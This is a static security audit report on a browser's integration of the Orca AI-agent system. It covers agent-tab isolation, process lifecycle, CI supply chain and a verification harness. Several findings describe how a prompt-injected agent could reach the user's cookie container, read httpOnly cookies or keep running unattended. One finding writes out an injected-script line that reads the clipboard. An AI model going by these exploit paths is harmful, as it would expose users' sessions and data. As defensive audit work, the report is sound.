# v1.7 code and security audit (Orca integration)

Static audit at e0c19c54. No build, gate row or live check was run, and no product code was changed. Every finding is for owner triage: fix, defer or reject. Nothing here has been accepted on the owner's behalf.

## Result

- **No finding is critical after verification.** Nothing found lets web content or the network run code or read a credential.
- **One high finding stands**, in the verification harness: the check that proves PowerBrowser's orcad never launches an installed Orca cannot fail (harness-live-security-01).
- **46 medium findings stand in layer 1**: 19 on the security surfaces (two of them describe the same defect) and 27 in the harness.
- **The per-phase reviews reported 117 findings**, 15 of them labelled critical by the reviewers. All 15 are functional defects. After a refutation pass none is above medium on this audit's scale: 4 repeat layer 1 findings, 9 are confirmed at medium, and 2 are plausible and affect only the Windows and macOS builds that D-40 moved to the next version.
- **367 declared threats were checked against the code**: 344 are closed, 23 are open, and 12 of the open ones are high. Ten of those twelve are phase 59 owner steps that have not run.

## What to decide first

Finding IDs refer to the sections below. "Plausible" means the code path exists as described and one named step needs a running system to settle.

### A. An agent steered by hostile page text can reach more than intended

1. **A crashed agent tab comes back as an ordinary user tab** (agent-browser-02, chrome-actor-02, 66-CR-01; confirmed). The agent flag is sent only on the first open. Reload, Back or Forward on a crashed agent tab re-creates it in the user's cookie container, with login autofill and without the popup, download, protocol and clipboard refusals that apply to agent tabs. The tab stays bound to the agent's page, so the agent keeps receiving its URL and title.
2. **All agents share one persistent cookie container, and an agent can read any host's cookies in it** (agent-browser-03; confirmed). `cookie.get` returns httpOnly values for a host of the agent's choosing, and `cookie.set` accepts any domain. A sign-in made in an agent tab is readable by every later agent in every worktree.
3. **Stop ends control of one tab, not of the agent** (agent-browser-04; confirmed). After Stop the agent can open a new background tab and continue there. The mark and its Stop button show only while a call is being served, and a plain navigation never lights them.
4. **Orca's renderer bundle runs inside the authenticated Theia document** (chrome-actor-03; plausible). The chrome-side sender check authenticates the document, so any script in Orca's views holds every privileged request kind, including clipboard read. Exploiting it needs a script-injection flaw in Orca's renderer, which this audit did not look for. Plan threat T-64-12 accepts "Orca code in the authenticated document", and owner item T-61-04 is still open.
5. **An Orca store activation can bring an agent web tab forward and give it keyboard focus** (theia-pane-hosting-02; plausible; cites D-34).

### B. Parts of the agent browser and pane hosting do not work as specified

6. **Page metadata never reaches orcad** (66-CR-02; confirmed). Three required fields are missing from every call, orcad's schema refuses it, and the error is discarded.
7. **The browser host cannot re-attach while any agent tab is bound** (66-CR-03; confirmed), so it does not recover after an orcad restart.
8. **Every automation call is cut off at 5 seconds** (66-CR-04; confirmed) and reported as a browser error, although chrome's own waits run up to 30 seconds.
9. **The Claude wrapper is not staged in packaged builds** (63-CR-01; confirmed; cites D-59), so the agent hooks are inactive in every packaged artifact. The development tree is unaffected.
10. **Diffs for added, deleted and untracked files do not open** (65-CR-01; confirmed).
11. **Automatic re-pair does not run after Restart Orca** (67-CR-01; confirmed), and a race on first pairing leaves the pane bundle broken until reload (pairing-credentials-01).
12. **An Orca tab cannot be closed while the pane bundle is booting or has failed** (theia-pane-hosting-01, 64-CR-02), **dark-mode utilities never apply in hosted panes** (overlay-renderer-02, 64-CR-01), and **closing one terminal split closes the wrong leaf** (overlay-renderer-01).

### C. Process lifecycle

13. **A PowerBrowser crash leaves orcad, its terminal daemon and every skip-permissions agent running** with nothing to stop them until the next launch (orcad-hosting-01; confirmed). D-07 covers quit only.
14. **Restart Orca on the failure page kills the daemon and agents that the crash path kept alive on purpose** (orcad-hosting-02; confirmed).

### D. Release path and CI

15. **Orca's from-source build runs on the persistent self-hosted runner outside the release container, and the runner user is in the libvirtd group** (ci-supply-chain-02, packaging-prefs-network-01; confirmed; D-26 is cited). A compromised Orca tag or dependency would run as a user that is root-equivalent on that host.
16. **A job that builds upstream code can replace an artifact that a later job signs or commits**, because the artifact has no digest tied to the job that made it (ci-supply-chain-01 for the release, ci-supply-chain-04 for the notices; both plausible).
17. **The runner unit as written cannot start and cannot run rootless podman** (59-CR-01, 59-CR-02; confirmed). The unit is not deployed on legion yet, so no run has hit this.
18. **Every hosted re-pin replay stops at the licence row** because the uBlock Origin XPI is never cached on the runner (68-CR-01; confirmed).
19. **Twelve high threats are open**: ten phase 59 owner steps (credentials, MAR key ceremony, runner install, token rotation, release and tag records), T-60-22 (the owner's own Claude sign-in record) and T-66-24 (two lane merges carried files outside their plans without an owner ruling). The Cloudflare token named in T-59-26 expires on 2026-12-06 according to docs/RENEWALS.md.

### E. Disclosure and licensing

20. **The privacy page understates what v1.7 sends** (packaging-prefs-network-03; confirmed; cites D-08). It ties api.anthropic.com to an added API key, while Orca agents send page and repository content to model providers under the user's own sign-ins.
21. **The endpoint allowlist does not cover several hosts Orca hosting contacts**, and two existing allow rows admit Orca requests under reasons written for other features (packaging-prefs-network-04; confirmed; cites D-08).
22. **Orca's own MIT copyright and permission notice ships nowhere in the package** (packaging-prefs-network-02; confirmed).

### F. The verification harness reports checks as passed that did not run

23. **The gate driver has no SKIP verdict.** A row that prints SKIP and exits 0 is recorded as PASS (harness-driver-01, confirmed against the code at scripts/verify-platform.sh:6985). Twelve findings name this cause.
24. **Hosted CI never fetches the Orca checkout**, so the Orca-derived clauses of the quick security rows skip, and pass, on every push and fork pull request (harness-driver-03, harness-static-hosting-01, harness-static-browser-03, harness-static-structure-01).
25. **The one high finding**: the decoy clause of the agent-browser live row cannot go red, because the launch environment replaces the decoy HOME before PowerBrowser starts (harness-live-security-01).
26. **Live rows state that they run under the live lock, but neither they nor the driver take it** (harness-live-security-05). Eight open medium threats in phases 62 to 68 are this same gap.
27. **Several checks turn an error into a pass**: a failed CLI read counts as "not listed" (harness-live-security-06), a probe error object counts as "absent" (harness-live-tabs-02), and a collector exception counts as a green sink (harness-static-hosting-03).
28. **Gate exclusions are wider than their ledger entries**: seven rows are excused under an entry that does not name them, for any failure reason (harness-driver-05).

## How the audit was run

- **Layer 1, trust-boundary audit.** Eighteen reviewers, each given one surface and its files: ten security surfaces (orcad hosting, pairing and credentials, sidecar gate and backend services, the privileged chrome actor, the agent browser, the overlay renderer, Theia pane hosting, agents and pre-installed extensions, CI and supply chain, packaging and network) and eight harness shards. A second agent then tried to refute each finding by reading the cited code itself. Critical and high findings got their own verifier; the rest were verified in batches of at most eight. Every assigned file was read; the coverage check found none skipped.
- **Layer 2, per-phase GSD passes.** `gsd-code-reviewer` at deep depth and `gsd-security-auditor` for each of phases 59 to 68, writing one REVIEW.md and one SECURITY.md per phase. The 11 critical-labelled review findings that layer 1 had not already verified went through the same refutation pass.
- **Spot checks by the orchestrating session.** The three agent-browser findings (A1 to A3) and the driver's missing SKIP verdict (F23) were read against the code directly and hold.

## Limits

- **Static only.** Each reviewer listed what it could not settle without a running system; those questions are in the last section and are candidates for live checks.
- **Upstream Orca source was not audited** (owner choice). It was read only to judge how PowerBrowser uses it. Item A4 depends on a class of defect that could exist there.
- **The harness got a targeted audit**, not a line-by-line review (owner choice): can each check fail, and is the script safe to run.
- **Warning and info findings from the per-phase reviews were not refutation-checked.**
- **Not reviewed as code:** THIRD-PARTY-NOTICES.txt, inventory/brand-tokens.json, lockfiles, the ledger, documents, and test fixtures.
- **Severity scale.** Critical: code execution or credential disclosure reachable from web content or the network, or CI secret exfiltration by an outsider. High: a privilege boundary crossed under preconditions an attacker can plausibly arrange, a release-path integrity failure, or a security check that cannot fail. Medium: a defence-in-depth gap with a concrete path, or a defect with a user-visible failure. Low: hardening. Info: observation.
- **Cost.** 97 agent runs and about 14.3 million subagent tokens: layer 1 used 56 runs, layer 2 used 30, and the refutation pass used 11.

The complete record of every layer 1 finding, with scenario, evidence and verifier reasoning, is in `v1.7-CODE-SECURITY-AUDIT-findings.json` next to this file.

## High findings (1)

### harness-live-security-01: Decoy clause (f) of orca-browser-agent-live cannot go red: liveEnv replaces the decoy HOME, so PB's orcad never sees ~/.local/bin/orca-ide

- **Severity:** high
- **Verdict:** CONFIRMED
- **Location:** `scripts/lib/firefox-bidi.mjs:194`
- **Category:** false-green

**What is wrong.** Clause (f) (P66-29) is meant to prove that PB's orcad does not launch an installed Orca. The check plants a decoy at <scratch HOME>/.local/bin/orca-ide and sets process.env.HOME to that folder before the launch. Every launch then passes through liveEnv(). liveEnv() treats realHomes() as the real home, and realHomes() includes os.homedir(), which on POSIX returns the current $HOME. At launch time $HOME is the decoy folder, so inRealHome(decoyHome) is true and HOME is replaced with liveHome() (.mozbuild/pb-live-profiles/pb-home-*). That folder has no decoy. PowerBrowser, orcad (HOME is on ORCAD_ENV_ALLOWLIST) and the CLI all run without the decoy. markerPresent can only be false. No assertion compares orcad's /proc environ HOME with the decoy folder, so nothing catches this.

**Scenario.** A regression drops ORCAD_HIDDEN_ELECTRON_SWITCH from buildOrcadEnv, so PB's orcad would start an installed Orca desktop. In orca-browser-agent-live the stock half still passes in its own process tree (its HOME is under XDG_RUNTIME_DIR, so it is kept). The PB half runs with HOME=pb-home-*, which holds no orca-ide, so no PROFILE_RECORD_FILE appears and clause (f) prints 'no decoy'. The row PASSes.

**Preconditions.** None beyond running the row. It happens on every run that reaches clause (f) with the stock half passing.

**Evidence.** scripts/lib/orca-browser-live.mjs:181 `if (home) process.env.HOME = home;`
scripts/lib/firefox-bidi.mjs:67-71 `return [...new Set([homedir(), pw]...` (homedir() reads $HOME)
scripts/lib/firefox-bidi.mjs:73-76 `return homes.some(h => within(p, h)) && !within(p, HARNESS_SCRATCH);`
scripts/lib/firefox-bidi.mjs:194 `if (inRealHome(out.HOME)) out.HOME = liveHome();`
scripts/lib/firefox-bidi.mjs:698 spawn `{ env: liveEnv(env) }` with env = process.env
scripts/verify-orca-browser-agent-live.mjs:820-824 decoy home made with mkdtempSync(tmpdir()) and passed as withBrowserSession({ home })
scripts/verify-orca-browser-agent-live.mjs:920 `markerPresent: roots.some((r) => existsSync(join(r, recordFile)))`; verdictDecoy (228-236) has no HOME positive read.

**Suggested fix.** Compute realHomes() once at module load from the passwd entry and the original $HOME, before any row changes process.env.HOME. Alternatively, have withBrowserSession pass the decoy HOME through an explicit env override that liveEnv keeps. In clause (f), add a positive read: /proc/<orcad>/environ HOME must equal the decoy folder, or the clause is 'detector blind'. Add a self-test plant for that.

**Verifier (CONFIRMED, high).** I traced the whole path myself.

1. The decoy setup is as described. liveRun (scripts/verify-orca-browser-agent-live.mjs:820-822) makes `home = mkdtempSync(join(tmpdir(), 'pb-agent-home-'))`, puts the decoy at home/.local/bin/orca-ide, and calls withBrowserSession({ log, home }).

2. withBrowserSession sets `process.env.HOME = home` (scripts/lib/orca-browser-live.mjs:181) before withOrcaTabsSession -> withProbeShell -> withFirefoxPage launches PowerBrowser. withFirefoxPage builds `env` from process.env and spawns with `{ env: liveEnv(env) }` (scripts/lib/firefox-bidi.mjs:686-698).

3. liveEnv (firefox-bidi.mjs:192-203) runs `if (inRealHome(out.HOME)) out.HOME = liveHome();`. inRealHome (73-77) defaults to `homes = realHomes()`, and realHomes (67-71) includes Node's os.homedir(). On POSIX, os.homedir() reads the current $HOME, which is now the decoy folder. So `within(decoy, decoy)` is true. The decoy is under tmpdir(), not under <repo>/.mozbuild, so the HARNESS_SCRATCH exemption does not apply. HOME becomes liveHome(), a fresh .mozbuild/pb-live-profiles/pb-home-* folder (144-166) with no .local/bin/orca-ide. The CLI is affected the same way: its cliEnv takes HOME from process.env.HOME (orca-browser-live.mjs:192), and liveEnv(cliEnv) at line 197 replaces it too. So PowerBrowser, and the orcad it spawns, never see the decoy.

4. Nothing checks this. verdictDecoy (verify-orca-browser-agent-live.mjs:228-236) looks at stock.pass, createOk, the title, the quiet window and markerPresent. markerPresent (920) only checks whether the record file exists under orcad's data roots. Nothing reads orcad's real HOME or confirms that the decoy was on its search path. The self-test only plants `markerPresent: true` into the observation object (1078), so it tests the verdict function, not the live wiring. The stock half runs in a separate process tree (hiddenElectronRun), so it still passes.

5. Result: if the hidden-Electron switch regresses, PB's orcad launches no decoy, because there is no decoy in its HOME. Clause (f) prints 'no decoy' and the row passes.

This is a security regression check that cannot go red in its intended case, so high under the rubric. Nothing I found in DECISIONS.md accepts this. The scratch-HOME ruling explains why liveEnv exists, but it does not exempt this check.

*Checked at:* scripts/lib/firefox-bidi.mjs:194 (HOME replaced because realHomes() at :67-71 includes homedir(), which equals the decoy set at scripts/lib/orca-browser-live.mjs:181); scripts/verify-orca-browser-agent-live.mjs:920 and :228-236 (markerPresent is the only decoy read, with no positive HOME check)

## Medium findings (46)

### orcad-hosting-01: A PowerBrowser crash leaves orcad, its terminal daemon and every skip-permissions agent running with nothing to stop them

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/OrcaService.sys.mjs:422`
- **Category:** leak

**What is wrong.** OrcaService has only two ways to end orcad: the quit-granted observer (line 88) and the named AsyncShutdown blocker (line 96). Neither runs when the browser crashes, is OOM-killed or gets SIGKILL. orcad has no parent-death watchdog. 62-RESEARCH item 2 confirms this, and orca-service-live depends on it ('proves orcad survived'). The terminal daemon runs detached in its own systemd user scope (daemon-cgroup-scope.ts), so killing the browser's cgroup does not end it either. The only cleanup is _reapLeftover at the next launch on the same profile. Until then, orcad keeps listening on 127.0.0.1:26768 holding the persisted device rows, and agents launched with D-12's skip-permissions keep executing tool calls (including ones steered by prompt injection) with no visible UI. D-07 says agents end when PowerBrowser quits. A crash is not a quit, so this gap is not covered by any decision.

**Scenario.** An agent is mid-task in an Orca terminal. PowerBrowser segfaults or the kernel OOM-kills it. The user does not relaunch for hours. The agent keeps running shell commands and network calls with skip-permissions, and orcad stays bound on 26768. Nothing in the tree stops either one before the next PowerBrowser start on that profile.

**Preconditions.** PowerBrowser ends without a granted quit (crash, SIGKILL, OOM kill, power-loss-free session kill) while orcad is running.

**Evidence.** OrcaService.sys.mjs:88 `this._quitObserverOff = PowerBrowserAPI.onQuitGranted(() => this.stop());` and :96 `PowerBrowserProcesses.addNamedReapBlocker(OrcaEnv.ORCAD_REAP_BLOCKER_NAME, reapBlocker);` are the only stop paths. :422 `proc = await PowerBrowserProcesses.spawnProcessExact({ command: this._nodePath, args, environment, workdir: this._effectiveRoot });` passes no liveness channel. Upstream orcad/main.ts and orcad-entry.ts contain no stdin-EOF or ppid watch. orcad-daemon-supervision.ts:1 says 'Detached terminal daemons must outlive orcad'. Leftovers are reaped only at the next start: OrcaService.sys.mjs:113 `await this._reapLeftover({ includeDaemon: true });`.

**Suggested fix.** Give orcad a liveness tie to the browser. Two options: a small launcher seam that exits orcad, and has the daemon tree reaped, when its stdin pipe from PowerBrowser reaches EOF (the pattern the Theia backend's parent-death watchdog already uses); or a PB-owned watchdog process that holds the pipe and ends the recorded identities when it closes. Add a live row that SIGKILLs PowerBrowser and requires the agent identities to be gone within a bound, not merely reaped at the next launch.

**Verifier (CONFIRMED, medium).** OrcaService has two stop paths and both run only on a granted quit: onQuitGranted (OrcaService.sys.mjs:88) and the AsyncShutdown appShutdownConfirmed blocker (:96, PowerBrowserAPI.sys.mjs:11052-11057). spawnProcessExact (PowerBrowserAPI.sys.mjs:10995) is a plain Subprocess.call with no IPC channel, so orcad's 'launcher disconnect' shutdown (orcad-lifecycle.ts:89-93) needs bundledLauncherChannel plus process.send and is never armed. orcad ignores SIGHUP (orcad-lifecycle.ts:85). It also ignores EPIPE/EIO from a closed output pipe (orcad-process-error-guards.ts:55-60), so losing the parent's stdout/stderr does not end it either. Idle exit does not apply: orcad-managed-idle-exit.ts:1,22 says user-started servers never idle out and live terminals block idle exit. The daemon is detached by design (orcad-daemon-supervision.ts:1). The only cleanup is _reapLeftover at the next start (:113). D-07 covers quit only, so no decision accepts the crash case. Severity stays medium: it is a gap in process lifetime, and the agents running unattended are the user's own agents with D-12 permissions; an attacker gains no new boundary crossing from it.

*Checked at:* No guard. OrcaService.sys.mjs:88,96 are quit-only. orcad-process-error-guards.ts:55-60 ignores EPIPE. orcad-lifecycle.ts:85 ignores SIGHUP. orcad-managed-idle-exit.ts:22 says paired servers never idle out.

### orcad-hosting-02: Restart Orca from the failure page kills the adopted terminal daemon and the agents that survived an orcad crash

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/OrcaService.sys.mjs:165`
- **Category:** data-loss

**What is wrong.** After an unexpected orcad exit, _supervise keeps _daemonPid and reaps with includeDaemon:false, so the daemon and its agent terminals stay alive for the next orcad to adopt (the comment at line 356: 'only a quit ends agents (D-07)'). If every respawn attempt fails, the state becomes failed and the failure page offers Restart. restart() runs _startSequence, which calls _reapLeftover({ includeDaemon: true }). That reads the state file, which still names the adopted daemon, and _endDaemon SIGTERMs and then SIGKILLs the daemon and every descendant. A user who presses Restart to get Orca back loses every running agent session and terminal that the crash path had kept alive on purpose.

**Scenario.** An agent runs a long task. orcad crashes, and during the backoff another process takes port 26768, or orcad crashes again before ready five times, so the state is failed. The user frees the port and clicks Restart Orca. _reapLeftover({includeDaemon:true}) kills the daemon from pb-orca-state.json along with its 'sleep 900' / agent descendants, and the user's in-progress agent work is gone.

**Preconditions.** orcad exits unexpectedly while agents run, every respawn attempt then fails, and the user presses Restart Orca.

**Evidence.** OrcaService.sys.mjs:165 `this._restartRun = this._startSequence().catch(err => this.reportUnexpectedFailure(err));` -> :113 `await this._reapLeftover({ includeDaemon: true });` -> :369-370 `if (own && includeDaemon) { await this._endDaemon(own.daemonPid, own.daemonTicks);`. The crash path is the opposite: :590 `await this._reapLeftover({ includeDaemon: false });`.

**Suggested fix.** Have restart() reap with includeDaemon:false when this._daemonPid still matches its recorded identity (an adopted daemon exists). Reserve the daemon reap for a cold start, where the record comes from a previous browser session.

**Verifier (CONFIRMED, medium).** _supervise (:574-595) leaves _daemonPid in place and reaps with includeDaemon:false (:590). _launch retries also reap with includeDaemon:false (:402). A failed _spawnAndGate never rewrites pb-orca-state.json, because writeStateFile at :508 runs only after a ready line. The state file therefore still names the adopted daemon. When the attempts run out or a port/lock code is non-recoverable (:395-396, :480-485), _fail sets the state to failed. restart() (:156-166) is allowed in that state and runs _startSequence, which calls _reapLeftover({includeDaemon:true}) (:113). That reaches _endDaemon(own.daemonPid, own.daemonTicks) (:369-370), which takes a snapshot of listProcessTree([pid]) (:335), SIGTERMs, and SIGKILLs every remaining row (:349). The ticks match, so the identity check passes. P67-06 says restart 'reaps as the launch path does', but it does not address the adopted daemon, and this contradicts the intent stated at :356-357.

*Checked at:* No guard. Path: OrcaService.sys.mjs:165 -> :113 -> :369-370 -> :333-349. The crash path deliberately uses includeDaemon:false at :590 and :402.

### pairing-credentials-01: handOff returns the offer before orca-panes-dir exists, so a poll in that gap fails the pane bundle boot until the document reloads

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `theia/extensions/orca-panes/src/node/orca-panes-backend-module.ts:154`
- **Category:** race

**What is wrong.** The protocol says handOff is undefined until both bridge files are written (orca-panes-protocol.ts:31). handOff checks only the web-pairing file. OrcaService._writeHandOff writes web-pairing first, then awaits pathExists(panesDir) and a whole second writePrivateFile before orca-panes-dir exists. If the frontend poll lands in that gap, the frontend gets the pairing and imports /orca-panes/pb-panes.js at once. bundleRootReal finds no orca-panes-dir and the route answers 404, so the boot fails at the load step. OrcaPaneBundle.ready caches the rejected promise and nothing resets it. OrcaHostingStatus.reconnect then does nothing: this.api is undefined, so it clears the client reason and returns. Its comment assumes the loader is still polling, but the loader has already failed. The chrome state is ready, so no failure class is set and no failure page appears. Orca tabs stay empty until the Theia document reloads.

**Scenario.** PowerBrowser launches and the Theia frontend starts polling handOff (1 s, 2 s, 4 s, then every 5 s). orcad prints its ready line. OrcaService writes web-pairing, and a handOff poll arrives before orca-panes-dir is renamed into place. The frontend loads pb-panes.js, gets a 404, and boot() rejects with failed set to 'load'. Every later bundle.ready() call rejects, and Reconnect does nothing.

**Preconditions.** A handOff poll lands within the few milliseconds between the two bridge-file writes at an orcad start.

**Evidence.** OrcaService.sys.mjs:552 writes the offer first: `await PowerBrowserProcesses.writePrivateFile(this._bridgeDir, OrcaEnv.ORCA_WEB_PAIRING_FILE, ...)`. Lines 559-567 run `pathExists(panesDir)` and then `writePrivateFile(..., ORCA_PANES_DIR_FILE, ...)`. orca-panes-backend-module.ts:169-198: handOff reads only WEB_PAIRING_FILE and returns `{ pairing }`. orca-panes-backend-module.ts:246-248: the route answers 404 when bundleRootReal() is undefined. orca-pane-bundle.ts:65-67: `return this.booting ??= this.boot();` and the boot catch at :94-97 rethrows. orca-hosting-status.ts:197-207: `if (this.api) {...}` then `// Not booted yet: the loader's own hand-off loop pairs with this offer.` and `this.setClientReason(undefined)`. pb-pane-mount.tsx:669 also memoises its own rejected `booting`.

**Suggested fix.** Make handOff return undefined until orca-panes-dir passes readBridgeFile, which is what the protocol already states. Alternatively, write orca-panes-dir before web-pairing in _writeHandOff. Also clear OrcaPaneBundle.booting on a load or pairing failure, so that Reconnect, or the next handOff that succeeds, can retry the boot.

**Verifier (CONFIRMED, medium).** I traced every step. OrcaService._writeHandOff (OrcaService.sys.mjs:550-570) writes web-pairing, then awaits pathExists(panesDir), then calls writePrivateFile for orca-panes-dir. writePrivateFile (PowerBrowserAPI.sys.mjs:11071-11089) runs about seven IOUtils calls in sequence, so the gap is a few milliseconds of async work. handOff (orca-panes-backend-module.ts:154-198) lstats and reads only WEB_PAIRING_FILE, so it returns { pairing } during that gap. This breaks the protocol contract at orca-panes-protocol.ts:31 ('undefined until both bridge files are written'). OrcaPaneBundle.waitForPairing (orca-pane-bundle.ts:102-110) returns on the first pairing, and boot() goes straight to loadEntry. The route (backend :232-248) calls bundleRootReal(), which hits ENOENT on orca-panes-dir and returns undefined, so the route answers 404. The inline module script's import() rejects and dispatches LOAD_FAILED_EVENT, and boot() sets failed='load' and rethrows (:94-97). ready() memoises that rejected promise through `this.booting ??= this.boot()` (:66), and nothing resets booting. In OrcaHostingStatus.onStart the reject path calls settle, so bootSettled becomes true and the stuck-boot check (:298-301) never runs. this.api stays undefined, so runReconnect (:197-207) only clears the client reason. Once chrome reaches ready, failureClass is null, so no failure page is shown and the widget host stays empty (orca-pane-widget.tsx:110,142-146). The window exists only on a start where orca-panes-dir is absent, which is the normal case after a clean quit because _stopTree removes it (:630). On an orcad respawn the old file is still there. The poll landing in the window depends on timing, but that is the stated precondition, not an open runtime question. The race is narrow but its effect is visible to the user and lasts until the document reloads, so medium stands.

*Checked at:* No guard. orca-panes-backend-module.ts:169-198 reads only web-pairing; OrcaService.sys.mjs:552 then :560-567; orca-pane-bundle.ts:66 `this.booting ??= this.boot()`; orca-hosting-status.ts:197-207 does nothing when api is undefined.

### chrome-actor-02: A crashed or lost agent tab is re-created without the agent flag, as a user tab in the user's container, with every agent wall gone

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `theia/extensions/tab-uris/src/browser/web-tab.ts:1305`
- **Category:** authz

**What is wrong.** WebTabWidget sends the agent flag only on the first webTabOpen (agentOpenSent). recreate() (the crash path, reached from navigate/back/forward/reload/gotoIndex when this.crashed) and reopen() (the lost-view Reload) close the overlay and send webTabOpen without `agent`. Chrome then builds an ordinary overlay: usercontextid 0 (the user's cookie jar), messagemanagergroup 'browsers' (login manager autofill and capture), autocomplete popup, the WebExtensions tab-host node, and no sandbox flags, so popups, downloads and external protocols are allowed. There is also no clipboard wall (the PowerBrowserAgentPage pair is agent-group only). The Theia widget still has agent=true and stays bound to the Orca browserPageId, so Orca's navigate command (see the previous finding) can keep sending this user-context tab to any http(s) URL. That breaks T-66-11's invariant that an agent overlay loads in the Orca-agent container and never the user's, and it bypasses D-35, D-37 and D-38 for that tab.

**Scenario.** An agent page exhausts its content process's memory, or the agent, which has a shell under D-12, kills that content process. Either way the agent tab is marked crashed. The agent then issues an Orca navigate to https://victim.example/action?x=1, or Orca's page recovery re-navigates. widget.navigate sees this.crashed and calls recreate(), which sends webTabClose and then webTabOpen without the agent flag. Chrome loads the agent-chosen URL in the user's default container with the user's Lax/None cookies attached. Later navigations to download URLs or to pages that redirect to an external protocol are no longer refused.

**Preconditions.** The agent tab's content process crashes (any page can force an OOM, and an agent with a shell can kill the pid), or the open reply times out. Then a navigate, back, forward or reload reaches the widget, from the agent's navigate command, Orca recovery or the user.

**Evidence.** web-tab.ts:984-986 `const agent = this.agent && !this.agentOpenSent; this.agentOpenSent = true; ... ...(agent ? { agent: true as const } : {})`; web-tab.ts:1216-1217 `if (this.crashed) { return this.recreate(); }`; web-tab.ts:1294-1296 `recreate() { await ...webTabClose...; return this.reopen(); }`; web-tab.ts:1305 `this.channel.request({ kind: 'webTabOpen', tabId: this.tabId, url: this.url, key: this.rowKey })` (no agent field). PowerBrowserAPI.sys.mjs:3588 `const userContextId = agent === true ? agentContainerId() : 0;` and 3613 `messagemanagergroup: "browsers"` apply when agent is false. agentTabCreated (sandboxFlags) runs only when `agent === true` (3655).

**Suggested fix.** Make the agent flag a property of the widget for its whole life: send `agent: true` on every webTabOpen for a widget with this.agent (recreate and reopen included). As a second wall, have chrome remember agent tabIds after webTabClose (or key by rowKey) and refuse a non-agent webTabOpen for a tabId that was an agent tab.

**Verifier (CONFIRMED, medium).** The core claim holds. web-tab.ts:984-986 sends agent:true only on the first webTabOpen (agentOpenSent). recreate() (web-tab.ts:1294-1297) and reopen() (web-tab.ts:1304-1305) send webTabOpen with no agent field. recreate() is reached from navigate, back, forward, gotoIndex and reload whenever this.crashed is set. The crash state comes from the generic oop-browser-crashed listener (PowerBrowserAPI.sys.mjs:5760-5766), which is attached to every overlay, agent overlays included. recreate() first sends webTabClose, which deletes the webTabs entry (4275), so the next webTabOpen takes the non-agent branch: userContextId 0 (3588), messagemanagergroup 'browsers' and PopupAutoComplete (3613-3614), and no agentTabCreated, so no sandbox flags, download wall or protocol wall (3655). The URL is this.url, which tracks the page's pushed URL (web-tab.ts:1565). Kept crash history is also restored into the user-container overlay (3662-3667). The overlay then loads the agent's last page or pages in the user's cookie jar, with the D-35, D-37 and D-38 walls gone. The trigger is concrete: any page can crash its content process, and the user then presses the crash placeholder's Reload button (web-tab.ts:949) or Back/Forward. The finding's agent-driven continuation is not reachable. orcad sends no 'navigate' to an existing bound page (see chrome-actor-01). The re-created entry has no agent flag, so agentWallVerdict (11206) answers not-agent-tab and the agent loses control of the tab. The impact is therefore that agent-chosen URLs load once, on a user action, in the user's container, outside the agent walls. The agent cannot steer the tab after that.

*Checked at:* web-tab.ts:1305 `this.channel.request({ kind: 'webTabOpen', tabId: this.tabId, url: this.url, key: this.rowKey })` has no agent field. PowerBrowserAPI.sys.mjs:3588 sets userContextId to 0 when agent is false. 3655 runs agentTabCreated only when agent === true. 5760 sets crashed for every overlay. The agent-control step is blocked by agentWallVerdict at 11206, because entry.agent is unset.

### chrome-actor-03: The chrome sender wall admits Orca's third-party renderer bundle, which runs in the Theia document, so any script in it reaches every privileged kind

- **Severity:** medium
- **Verdict:** PLAUSIBLE
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:319`
- **Category:** trust-boundary

**What is wrong.** groupSenderIsTheia authenticates a document: the shell's content browser, the sidecar port, and 127.0.0.1/localhost. v1.7 loads Orca's pane bundle (Orca's React renderer, which shows agent chat output, terminal content and repository data) into that same document (orca-pane-bundle.ts: 'loads the Orca pane bundle into the Theia document'). Every PowerBrowserGroupMutation kind therefore trusts Orca's renderer code as much as PowerBrowser's own frontend. That includes the store kinds such as readClipboardText, which INTERNAL-APIS says is 'sent only from address-bar.tsx after the user chose one' but which chrome cannot enforce. It also includes webTabOpen of any http(s) URL in the user's container, webTabAgent on every agent tab, openStockTab, shellStateSave, restartToUpdate and orcaRestart. A script-injection flaw in Orca's renderer (for example markdown or HTML from a prompt-injected agent's output) becomes code in the privileged channel's trusted document. PowerBrowser relies on upstream Orca's renderer being free of injection for this boundary to hold.

**Scenario.** A prompt-injected agent emits chat output that triggers an HTML-injection flaw in Orca's chat renderer at the pinned tag. The injected script runs in the Theia document and dispatches `new CustomEvent('PowerBrowserGroupRequest', {detail:{requestId:'x', msg:{kind:'readClipboardText'}}})`. PowerBrowserGroupChild forwards it, groupSenderIsTheia passes, and chrome returns the system clipboard text. The same script can open user-container tabs or drive agent tabs.

**Preconditions.** Script execution inside the Theia document through Orca's renderer: an injection flaw in Orca's views reachable from agent or repository content, or a compromised Orca re-pin.

**Evidence.** PowerBrowserAPI.sys.mjs:319-349 groupSenderIsTheia checks only `embeddedByPrimary && embeddedByShell && port === groupSenderPort && groupSenderSpecIsTheia(spec)`. PowerBrowserAPI.sys.mjs:4552-4557 routes every kind (shell, store, web-tab action, group mutation) after that document check only. PowerBrowserAPI.sys.mjs:4701-4702 `case "readClipboardText": { return { ok: true, kind, text: readClipboardText() }; }`. orca-pane-bundle.ts header: 'loads the Orca pane bundle into the Theia document and boots it once'. The 64 threat register lists T-64-12 'Orca code in the authenticated document | medium | accept', and owner item T-61-04 is still open in STATE.md.

**Suggested fix.** Host the Orca bundle in a separate origin or frame that the PowerBrowserGroup actor does not match (Route B'), or add a per-kind capability that Orca code cannot reach. For example, keep the privileged kinds (clipboard read, save paths, update/restart, user-tab open) on a nonce or MessagePort handed only to PB's own modules at startup, before the Orca bundle loads. At minimum, record T-61-04 as an owner decision.

